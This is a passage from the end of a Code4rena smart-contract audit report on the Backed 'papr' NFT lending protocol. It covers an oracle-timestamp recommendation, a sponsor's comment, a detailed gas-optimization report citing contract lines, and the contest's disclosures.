attacker can possibly control the price of a single NFT, and liquidate many users.\n\n## [N-01] More accurate to use `<=` for validity of oracle timestamp\n\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/ReservoirOracleUnderwriter.sol#L106\n\nCurrently, the check for oracle timestamp to not exceed `block.timestamp` is done with a strict comparison. Using `<=` can be better here as `VALID_FOR` implies that the oracle timestamp would be valid for the entire duration.\n\n> `oracleInfo.message.timestamp + VALID_FOR < block.timestamp`\n\n### Recommendation\nChange to `oracleInfo.message.timestamp + VALID_FOR <= block.timestamp`\n\n**[wilsoncusack (Backed) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/147#issuecomment-1410918068):**\n>\n> I disagree with `L-02 - latestAuctionStartTime can be wrongly set to 0 even if an NFT is still selling in auction.`\n>\n>The intent of latestAuctionStartTime is to ensure min spacing between any two auctions. If two auctions are running, that means that minSpacing time has passed. If minSpacing time has passed, then it is OK to reset latestAuctionStartTime after purchasing the latest auction to allow a 3rd auction to start.\n>\n***\n\n# Gas Optimizations\n\nFor this contest, 15 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-12-backed-findings/issues/124) by **IllIllI** received the top score from the judge.\n\n*The following wardens also submitted reports: [c3phas](https://github.com/code-423n4/2022-12-backed-findings/issues/274), \n[rjs](https://github.com/code-423n4/2022-12-backed-findings/issues/273), \n[0xSmartContract](https://github.com/code-423n4/2022-12-backed-findings/issues/261), \n[Aymen0909](https://github.com/code-423n4/2022-12-backed-findings/issues/253), \n[noot](https://github.com/code-423n4/2022-12-backed-findings/issues/250), \n[TomJ](https://github.com/code-423n4/2022-12-backed-findings/issues/213), \n[Mukund](https://github.com/code-423n4/2022-12-backed-findings/issues/184), \n[Awesome](https://github.com/code-423n4/2022-12-backed-findings/issues/161), \n[rbitbytes](https://github.com/code-423n4/2022-12-backed-findings/issues/100), \n[RaymondFam](https://github.com/code-423n4/2022-12-backed-findings/issues/77), \n[saneryee](https://github.com/code-423n4/2022-12-backed-findings/issues/58), \n[Rolezn](https://github.com/code-423n4/2022-12-backed-findings/issues/13), \n[eyexploit](https://github.com/code-423n4/2022-12-backed-findings/issues/9), and\n[0xhacksmithh](https://github.com/code-423n4/2022-12-backed-findings/issues/4)\n.*\n\n## Gas Optimizations Summary\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;01] | Avoid contract existence checks by using low level calls | 7 |  700 |\n| [G&#x2011;02] | `internal` functions only called once can be inlined to save gas | 5 |  100 |\n| [G&#x2011;03] | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 1 |  85 |\n| [G&#x2011;04] | `keccak256()` should only need to be called on a specific string literal once | 2 |  84 |\n| [G&#x2011;05] | Optimize names to save gas | 8 |  176 |\n| [G&#x2011;06] | Use a more recent version of solidity | 10 |  - |\n| [G&#x2011;07] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 1 |  5 |\n| [G&#x2011;08] | Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead | 5 |  - |\n| [G&#x2011;09] | Using `private` rather than `public` for constants, saves gas | 2 |  - |\n| [G&#x2011;10] | Division by two should use bit shifting | 1 |  20 |\n| [G&#x2011;11] | Functions guaranteed to revert when called by normal users can be marked `payable` | 8 |  168 |\n\nTotal: 50 instances over 11 issues with **1338 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.\n\n## [G&#x2011;01]  Avoid contract existence checks by using low level calls\n\nPrior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence.\n\n*There are 7 instances of this issue:*\n\n```solidity\nFile: src/libraries/OracleLibrary.sol\n\n/// @audit observe()\n59:           (int56[] memory tickCumulatives,) = IUniswapV3Pool(pool).observe(secondAgos);\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L59\n\n```solidity\nFile: src/libraries/UniswapHelpers.sol\n\n/// @audit swap()\n40:           (int256 amount0, int256 amount1) = IUniswapV3Pool(pool).swap(\n\n/// @audit slot0()\n83:           (, int24 tick,,,,,) = IUniswapV3Pool(pool).slot0();\n\n/// @audit token0()\n/// @audit token0()\n93:           return IUniswapV3Pool(pool1).token0() == IUniswapV3Pool(pool2).token0()\n\n/// @audit token1()\n/// @audit token1()\n94:               && IUniswapV3Pool(pool1).token1() == IUniswapV3Pool(pool2).token1();\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/UniswapHelpers.sol#L40\n\n## [G&#x2011;02]  `internal` functions only called once can be inlined to save gas\n\nNot inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: src/PaprController.sol\n\n424       function _removeCollateral(\n425           address sendTo,\n426           IPaprController.Collateral calldata collateral,\n427           uint256 oraclePrice,\n428:          uint256 cachedTarget\n\n493       function _increaseDebtAndSell(\n494           address account,\n495           address proceedsTo,\n496           ERC721 collateralAsset,\n497           IPaprController.SwapParams memory params,\n498           ReservoirOracleUnderwriter.OracleInfo memory oracleInfo\n499:      ) internal returns (uint256 amountOut) {\n\n519       function _purchaseNFTAndUpdateVaultIfNeeded(Auction calldata auction, uint256 maxPrice, address sendTo)\n520           internal\n521:          returns (uint256)\n\n532       function _handleExcess(uint256 excess, uint256 neededToSaveVault, uint256 debtCached, Auction calldata auction)\n533           internal\n534:          returns (uint256 remaining)\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L424-L428\n\n```solidity\nFile: src/UniswapOracleFundingRateController.sol\n\n156:      function _multiplier(uint256 _mark_, uint256 cachedTarget) internal view returns (uint256) {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L156\n\n## [G&#x2011;03]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement\n`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src/PaprController.sol\n\n/// @audit if-condition on line 542\n546:              papr.transfer(auction.nftOwner, totalOwed - debtCached);\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L546\n\n## [G&#x2011;04]  `keccak256()` should only need to be called on a specific string literal once\n\nIt should be saved to an immutable variable, and the variable used instead. If the hash is being used as a part of a function selector, the cast to `bytes4` should also only be done once.\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: src/ReservoirOracleUnderwriter.sol\n\n75:                               keccak256(\"Message(bytes32 id,bytes payload,uint256 timestamp)\"),\n\n94:                   keccak256(\"ContractWideCollectionPrice(uint8 kind,uint256 twapSeconds,address contract)\"),\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/ReservoirOracleUnderwriter.sol#L75\n\n## [G&#x2011;05]  Optimize names to save gas\n\n`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).\n\n*There are 8 instances of this issue:*\n\n```solidity\nFile: src/interfaces/IFundingRateController.sol\n\n/// @audit updateTarget(), lastUpdated(), target(), newTarget(), mark(), papr(), fundingPeriod()\n6:    interface IFundingRateController {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IFundingRateController.sol#L6\n\n```solidity\nFile: src/interfaces/IPaprController.sol\n\n/// @audit addCollateral(), removeCollateral(), increaseDebt(), reduceDebt(), increaseDebtAndSell(), buyAndReduceDebt(), purchaseLiquidationAuctionNFT(), startLiquidationAuction(), setPool(), setFundingPeriod(), setLiquidationsLocked(), setAllowedCollateral(), sendPaprFromAuctionFees(), burnPaprFromAuctionFees(), collateralOwner(), isAllowed(), liquidationsLocked(), token0IsUnderlying(), maxLTV(), liquidationAuctionMinSpacing(), perPeriodAuctionDecayWAD(), auctionDecayPeriod(), auctionStartPriceMultiplier(), liquidationPenaltyBips(), maxDebt(), vaultInfo()\n9:    interface IPaprController {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IPaprController.sol#L9\n\n```solidity\nFile: src/interfaces/IUniswapOracleFundingRateController.sol\n\n/// @audit pool()\n6:    interface IUniswapOracleFundingRateController is IFundingRateController {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IUniswapOracleFundingRateController.sol#L6\n\n```solidity\nFile: src/NFTEDA/interfaces/INFTEDA.sol\n\n/// @audit auctionCurrentPrice(), auctionID(), auctionStartTime()\n7:    interface INFTEDA {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/interfaces/INFTEDA.sol#L7\n\n```solidity\nFile: src/NFTEDA/NFTEDA.sol\n\n/// @audit auctionCurrentPrice(), auctionID(), auctionStartTime()\n11:   abstract contract NFTEDA is INFTEDA {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/NFTEDA.sol#L11\n\n```solidity\nFile: src/PaprController.sol\n\n/// @audit uniswapV3SwapCallback()\n18:   contract PaprController is\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L18\n\n```solidity\nFile: src/ReservoirOracleUnderwriter.sol\n\n/// @audit underwritePriceForCollateral()\n7:    contract ReservoirOracleUnderwriter {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/ReservoirOracleUnderwriter.sol#L7\n\n```solidity\nFile: src/UniswapOracleFundingRateController.sol\n\n/// @audit mark()\n15:   contract UniswapOracleFundingRateController is IUniswapOracleFundingRateController {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L15\n\n## [G&#x2011;06]  Use a more recent version of Solidity\n\nUse a Solidity version of at least 0.8.2 to get simple compiler automatic inlining.\n\nUse a Solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads.\n\nUse a Solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings.\n\nUse a Solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value.\n\n*There are 10 instances of this issue:*\n\n```solidity\nFile: src/interfaces/IFundingRateController.sol\n\n2:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IFundingRateController.sol#L2\n\n```solidity\nFile: src/interfaces/IPaprController.sol\n\n2:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IPaprController.sol#L2\n\n```solidity\nFile: src/interfaces/IUniswapOracleFundingRateController.sol\n\n2:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/interfaces/IUniswapOracleFundingRateController.sol#L2\n\n```solidity\nFile: src/libraries/OracleLibrary.sol\n\n2:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L2\n\n```solidity\nFile: src/libraries/PoolAddress.sol\n\n4:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/PoolAddress.sol#L4\n\n```solidity\nFile: src/libraries/UniswapHelpers.sol\n\n2:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/UniswapHelpers.sol#L2\n\n```solidity\nFile: src/NFTEDA/extensions/NFTEDAStarterIncentive.sol\n\n2:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/extensions/NFTEDAStarterIncentive.sol#L2\n\n```solidity\nFile: src/NFTEDA/interfaces/INFTEDA.sol\n\n2:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/interfaces/INFTEDA.sol#L2\n\n```solidity\nFile: src/NFTEDA/libraries/EDAPrice.sol\n\n2:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/libraries/EDAPrice.sol#L2\n\n```solidity\nFile: src/NFTEDA/NFTEDA.sol\n\n2:    pragma solidity >=0.8.0;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/NFTEDA.sol#L2\n\n## [G&#x2011;07]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)\n\nSaves **5 gas per loop**\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src/libraries/OracleLibrary.sol\n\n48:                   twat--;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L48\n\n## [G&#x2011;08]  Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead\n\n> When using elements that are smaller than 32 bytes, your contract's gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\n\nEach operation involving a `uint8` costs an extra [**22-28 gas**](https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977) (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: src/libraries/OracleLibrary.sol\n\n/// @audit int24 twat\n44:               twat = int24(delta / twapDuration);\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L44\n\n```solidity\nFile: src/PaprController.sol\n\n/// @audit uint16 newCount\n438:              newCount = _vaultInfo[msg.sender][collateral.addr].count - 1;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L438\n\n```solidity\nFile: src/UniswapOracleFundingRateController.sol\n\n/// @audit uint48 _lastUpdated\n55:           _lastUpdated = uint48(block.timestamp);\n\n/// @audit uint48 _lastUpdated\n100:          _lastUpdated = uint48(block.timestamp);\n\n/// @audit int56 tickCumulative\n143:          tickCumulative = OracleLibrary.latestCumulativeTick(pool);\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L55\n\n## [G&#x2011;09]  Using `private` rather than `public` for constants, saves gas\n\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: src/UniswapOracleFundingRateController.sol\n\n25:       uint256 public immutable targetMarkRatioMax;\n\n27:       uint256 public immutable targetMarkRatioMin;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L25\n\n## [G&#x2011;10]  Division by two should use bit shifting\n\n`<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both, the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff) due to `JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using `unchecked {}` around the division by two.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src/libraries/UniswapHelpers.sol\n\n111:          return TickMath.getSqrtRatioAtTick(TickMath.getTickAtSqrtRatio(uint160((token1ONE << 96) / token0ONE)) / 2);\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/UniswapHelpers.sol#L111\n\n## [G&#x2011;11]  Functions guaranteed to revert when called by normal users can be marked `payable`\n\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.\n\n*There are 8 instances of this issue:*\n\n```solidity\nFile: src/PaprController.sol\n\n350:      function setPool(address _pool) external override onlyOwner {\n\n355:      function setFundingPeriod(uint256 _fundingPeriod) external override onlyOwner {\n\n360:      function setLiquidationsLocked(bool locked) external override onlyOwner {\n\n365       function setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs)\n366           external\n367           override\n368:          onlyOwner\n\n382:      function sendPaprFromAuctionFees(address to, uint256 amount) external override onlyOwner {\n\n386:      function burnPaprFromAuctionFees(uint256 amount) external override onlyOwner {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L350\n\n```solidity\nFile: src/PaprToken.sol\n\n24:       function mint(address to, uint256 amount) external onlyController {\n\n28:       function burn(address account, uint256 amount) external onlyController {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprToken.sol#L24\n\n\n___\n\n## Excluded Gas Optimizations Findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;12] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 1 |  120 |\n| [G&#x2011;13] | State variables should be cached in stack variables rather than re-reading them from storage | 2 |  194 |\n| [G&#x2011;14] | `<array>.length` should not be looked up in every loop of a `for`-loop | 3 |  9 |\n| [G&#x2011;15] | Using `bool`s for storage incurs overhead | 3 |  51300 |\n| [G&#x2011;16] | Using `private` rather than `public` for constants, saves gas | 1 |  - |\n| [G&#x2011;17] | Use custom errors rather than `revert()`/`require()` strings to save gas | 1 |  - |\n\nTotal: 11 instances over 6 issues with **51623 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.\n\n## [G&#x2011;12]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src/ReservoirOracleUnderwriter.sol\n\n/// @audit oracleInfo - (valid but excluded finding)\n64        function underwritePriceForCollateral(ERC721 asset, PriceKind priceKind, OracleInfo memory oracleInfo)\n65            public\n66:           returns (uint256)\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/ReservoirOracleUnderwriter.sol#L64-L66\n\n## [G&#x2011;13]  State variables should be cached in stack variables rather than re-reading them from storage\nThe instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: src/UniswapOracleFundingRateController.sol\n\n/// @audit pool on line 102 - (valid but excluded finding)\n103:          _lastTwapTick = UniswapHelpers.poolCurrentTick(pool);\n\n/// @audit pool on line 112 - (valid but excluded finding)\n112:          if (pool != address(0) && !UniswapHelpers.poolsHaveSameTokens(pool, _pool)) revert PoolTokensDoNotMatch();\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L103\n\n## [G&#x2011;14]  `<array>.length` should not be looked up in every loop of a `for`-loop\nThe overheads outlined below are _PER LOOP_, excluding the first loop\n* storage arrays incur a Gwarmaccess (**100 gas**)\n* memory arrays use `MLOAD` (**3 gas**)\n* calldata arrays use `CALLDATALOAD` (**3 gas**)\n\nCaching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: src/PaprController.sol\n\n/// @audit (valid but excluded finding)\n99:           for (uint256 i = 0; i < collateralArr.length;) {\n\n/// @audit (valid but excluded finding)\n118:          for (uint256 i = 0; i < collateralArr.length;) {\n\n/// @audit (valid but excluded finding)\n370:          for (uint256 i = 0; i < collateralConfigs.length;) {\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L99\n\n## [G&#x2011;15]  Using `bool`s for storage incurs overhead\n\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\n\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past.\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: src/PaprController.sol\n\n/// @audit (valid but excluded finding)\n32:       bool public override liquidationsLocked;\n\n/// @audit (valid but excluded finding)\n35:       bool public immutable override token0IsUnderlying;\n\n/// @audit (valid but excluded finding)\n60:       mapping(address => bool) public override isAllowed;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L32\n\n## [G&#x2011;16]  Using `private` rather than `public` for constants, saves gas\n\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src/PaprController.sol\n\n/// @audit (valid but excluded finding)\n30:       uint256 public constant BIPS_ONE = 1e4;\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L30\n\n## [G&#x2011;17]  Use custom errors rather than `revert()`/`require()` strings to save gas\nCustom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src/libraries/OracleLibrary.sol\n\n/// @audit (valid but excluded finding)\n39:           require(twapDuration != 0, \"BP\");\n\n```\nhttps://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L39\n\n**[trust1995 (judge) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/124#issuecomment-1364719842):**\n > Please also view [#13](https://github.com/code-423n4/2022-12-backed-findings/issues/13) for an excellent gas report.\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}